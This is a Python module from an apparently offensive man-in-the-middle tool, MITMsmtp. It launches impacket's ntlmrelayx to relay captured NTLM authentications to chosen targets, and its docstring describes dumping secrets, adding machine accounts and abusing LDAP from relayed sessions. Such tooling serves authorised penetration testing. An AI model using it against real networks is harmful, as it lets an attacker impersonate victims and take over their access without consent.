#!/usr/bin/env python3

"""
NTLM relay integration for MITMsmtp.

Capturing an NTLM authentication (see SMBServer.py) lets you crack the
resulting NetNTLM hash *offline*. Relaying is a different, live attack: instead
of answering the client with our own challenge, the authentication is forwarded
to a third-party target so that the target authenticates us *as the victim*,
giving an authenticated session we can act on (dump secrets, add a machine
account, abuse LDAP ACLs, proxy the session via SOCKS, etc.).

Rather than reimplementing this (which would be a strictly worse clone of a
large, battle-tested tool), MITMsmtp delegates relaying to impacket's
``ntlmrelayx``. This module builds the appropriate ``ntlmrelayx`` command line
from MITMsmtp's options, launches it as a subprocess, and streams its output
prefixed with ``[RELAY]`` so it integrates with the rest of the runner.

Notes / caveats:
* ``ntlmrelayx`` binds its own SMB (445) and HTTP (80) listeners, so relay mode
  is mutually exclusive with MITMsmtp's own SMB server. The DNS responder and
  SMTP server can still run alongside it.
* Relay only succeeds when the *target* does not enforce session signing (we
  never learn the session key). This is why cross-protocol relay
  (SMB -> LDAP/LDAPS/HTTP) is usually the productive path against modern hosts.
* impacket is an optional dependency. Install it with ``pip install impacket``
  (or ``pip install MITMsmtp[relay]``).

Legal/Ethical use only: run this against systems you own or are explicitly
authorised to test.
"""

import os
import sys
import time
import shlex
import shutil
import tempfile
import threading
import subprocess

# Candidate executable names for impacket's ntlmrelayx, in preference order.
# - "ntlmrelayx.py" / "ntlmrelayx": pip install impacket (and most setups)
# - "impacket-ntlmrelayx": Kali / Parrot / Debian "impacket-scripts" package,
#   which installs the example scripts to /usr/bin with an "impacket-" prefix.
_NTLMRELAYX_NAMES = ("ntlmrelayx.py", "ntlmrelayx", "impacket-ntlmrelayx")


class NTLMRelay:
    """
    Thin wrapper that drives impacket's ntlmrelayx as a subprocess.
    """

    def __init__(self,
                 targets=None,
                 targets_file=None,
                 smb2support=True,
                 interface_ip=None,
                 socks=False,
                 output_prefix=None,
                 extra_args=None,
                 binary=None,
                 print_output=True):
        """
        @param targets: list of relay targets (e.g. ["smb://10.0.0.5", "ldaps://dc01"])
        @param targets_file: path to a file of targets (ntlmrelayx -tf)
        @param smb2support: pass -smb2support (recommended; most clients use SMB2+)
        @param interface_ip: IP for ntlmrelayx to bind its listeners to (-ip)
        @param socks: start the SOCKS proxy to reuse relayed sessions (-socks)
        @param output_prefix: file prefix for dumped loot (-of)
        @param extra_args: raw passthrough args (str or list) appended verbatim
        @param binary: explicit path to ntlmrelayx(.py); auto-detected if None
        @param print_output: stream ntlmrelayx output prefixed with [RELAY]
        """
        self.targets = list(targets) if targets else []
        self.targets_file = targets_file
        self.smb2support = smb2support
        self.interface_ip = interface_ip
        self.socks = socks
        self.output_prefix = output_prefix
        self.binary = binary
        self.print_output = print_output

        if isinstance(extra_args, str):
            self.extra_args = shlex.split(extra_args)
        else:
            self.extra_args = list(extra_args) if extra_args else []

        if not self.targets and not self.targets_file:
            raise ValueError("NTLM relay requires at least one target (--relay-target or --relay-targets-file)")

        self.process = None
        self.thread = None
        self._temp_targets_file = None

    @staticmethod
    def _extra_search_dirs():
        """Directories to check beyond $PATH.

        This matters when ntlmrelayx was pip-installed into a virtualenv but the
        process PATH does not contain the venv's bin directory -- most commonly
        when running under ``sudo`` (which resets PATH to a sanitized
        secure_path). The currently running interpreter (``sys.executable``)
        still points into the venv, so its bin directory is the reliable place
        to look. We also check $VIRTUAL_ENV and Debian/Kali's bundled examples.
        """
        dirs = []
        # bin/ of the interpreter actually running us (the active venv)
        dirs.append(os.path.dirname(os.path.abspath(sys.executable)))
        venv = os.environ.get("VIRTUAL_ENV")
        if venv:
            dirs.append(os.path.join(venv, "bin"))
        dirs.append(os.path.expanduser("~/.local/bin"))
        # Debian/Kali ship the example scripts here (as documentation)
        dirs.append("/usr/share/doc/python3-impacket/examples")
        # If impacket is importable, look in the bin/ next to its site-packages
        try:
            import impacket
            site_packages = os.path.dirname(os.path.dirname(impacket.__file__))
            dirs.append(os.path.join(os.path.dirname(site_packages), "bin"))
        except Exception:
            pass
        # De-duplicate while preserving order
        seen = set()
        unique = []
        for d in dirs:
            if d and d not in seen:
                seen.add(d)
                unique.append(d)
        return unique

    @staticmethod
    def find_binary():
        """Return the path to ntlmrelayx if available, otherwise None."""
        # 1) Anything on PATH (pip install in an active venv, Kali impacket-scripts)
        for name in _NTLMRELAYX_NAMES:
            path = shutil.which(name)
            if path:
                return path
        # 2) Known locations that PATH may miss (e.g. venv bin when run via sudo)
        for directory in NTLMRelay._extra_search_dirs():
            for name in _NTLMRELAYX_NAMES:
                candidate = os.path.join(directory, name)
                if os.path.isfile(candidate):
                    return candidate
        return None

    @staticmethod
    def impacket_installed():
        """Return True if the impacket library can be imported."""
        try:
            import impacket  # noqa: F401
            return True
        except Exception:
            return False

    def _resolve_targets_args(self, allow_tempfile=True):
        """Return the ntlmrelayx target arguments (-t / -tf)."""
        if self.targets_file:
            return ["-tf", self.targets_file]
        if len(self.targets) == 1:
            return ["-t", self.targets[0]]
        # Multiple inline targets: ntlmrelayx takes a single -t, so write a file.
        if allow_tempfile:
            if self._temp_targets_file is None:
                fd, path = tempfile.mkstemp(prefix="mitmsmtp_relay_targets_", suffix=".txt")
                with os.fdopen(fd, "w") as f:
                    f.write("\n".join(self.targets) + "\n")
                self._temp_targets_file = path
            return ["-tf", self._temp_targets_file]
        # Dry build without side effects: show a placeholder.
        return ["-tf", "<targets-file>"]

    def build_command(self, allow_tempfile=True):
        """Build the ntlmrelayx argv. Pure enough to print for --relay-dry-run.

        @param allow_tempfile: when False, no temp targets file is written
                               (used for dry-run/printing so it has no side effects)
        """
        binary = self.binary or self.find_binary() or _NTLMRELAYX_NAMES[0]
        cmd = [binary]
        cmd += self._resolve_targets_args(allow_tempfile=allow_tempfile)
        if self.smb2support:
            cmd.append("-smb2support")
        if self.interface_ip:
            cmd += ["-ip", self.interface_ip]
        if self.socks:
            cmd.append("-socks")
        if self.output_prefix:
            cmd += ["-of", self.output_prefix]
        cmd += self.extra_args
        return cmd

    def start(self):
        """Launch ntlmrelayx as a subprocess."""
        if self.process is not None:
            raise ValueError("NTLM relay is already running")

        binary = self.binary or self.find_binary()
        if binary is None:
            hint = ("ntlmrelayx not found (looked for %s on PATH and in %s).\n"
                    "Install impacket to enable relay mode:\n"
                    "    pip install impacket        # or: pip install MITMsmtp[relay]\n"
                    "    apt install impacket-scripts # Kali/Parrot/Debian (provides impacket-ntlmrelayx)\n"
                    "If it is pip-installed in a virtualenv and you are using sudo, sudo strips the\n"
                    "venv from PATH. Run the venv's Python directly, e.g.:\n"
                    "    sudo \"$(command -v python3)\" -m MITMsmtp --relay ...\n"
                    "or point --relay-bin at the binary directly (e.g. --relay-bin \"$(command -v ntlmrelayx.py)\")."
                    % (", ".join(_NTLMRELAYX_NAMES), ", ".join(self._extra_search_dirs())))
            raise RuntimeError(hint)
        self.binary = binary

        cmd = self.build_command(allow_tempfile=True)
        # If we resolved a .py script, run it with the current interpreter. This
        # keeps it inside the active venv (where impacket is importable) and also
        # works when the script lacks the executable bit (e.g. the Debian/Kali
        # /usr/share/doc examples copy).
        if cmd[0].endswith(".py"):
            cmd = [sys.executable] + cmd

        print("[RELAY] Starting ntlmrelayx: %s" % " ".join(shlex.quote(c) for c in cmd))

        self.process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )

        if self.print_output:
            self.thread = threading.Thread(target=self._pump_output)
            self.thread.daemon = True
            self.thread.start()

        # If ntlmrelayx dies right away, surface a clear diagnosis rather than
        # leaving the user staring at a raw traceback. The most common cause is
        # an interpreter mismatch: e.g. running under sudo picks the system
        # Python (not your venv), which may be too old to even parse a newer
        # ntlmrelayx.py (SyntaxError) or may not have impacket importable.
        time.sleep(1.5)
        if self.process.poll() is not None and self.process.returncode != 0:
            code = self.process.returncode
            raise RuntimeError(
                "ntlmrelayx exited immediately (exit code %d) -- see the [RELAY] output above.\n"
                "Most often this is a Python/impacket mismatch:\n"
                "  - A 'SyntaxError' means the Python launching ntlmrelayx (%s) is too old to\n"
                "    parse that ntlmrelayx.py. This usually happens under sudo, which uses the\n"
                "    system Python instead of your virtualenv. Run MITMsmtp with the venv's\n"
                "    Python so both match, e.g.:\n"
                "        sudo \"%s\" -m MITMsmtp --relay ...\n"
                "    and let auto-detection pick the matching ntlmrelayx (drop --relay-bin, or\n"
                "    point it at that venv's ntlmrelayx.py rather than the /usr/share/doc copy).\n"
                "  - An ImportError for impacket means it is not installed for that interpreter."
                % (code, sys.executable, sys.executable))

    def _pump_output(self):
        """Stream subprocess output with a [RELAY] prefix."""
        try:
            for line in self.process.stdout:
                print("[RELAY] " + line.rstrip("\n"))
        except Exception:
            pass

    def stop(self):
        """Terminate ntlmrelayx and clean up."""
        if self.process is not None:
            try:
                self.process.terminate()
                try:
                    self.process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.process.kill()
            except Exception:
                pass
            self.process = None
            if self.thread:
                self.thread.join(timeout=2)
                self.thread = None
            print("[RELAY] ntlmrelayx stopped")

        if self._temp_targets_file and os.path.exists(self._temp_targets_file):
            try:
                os.remove(self._temp_targets_file)
            except OSError:
                pass
            self._temp_targets_file = None
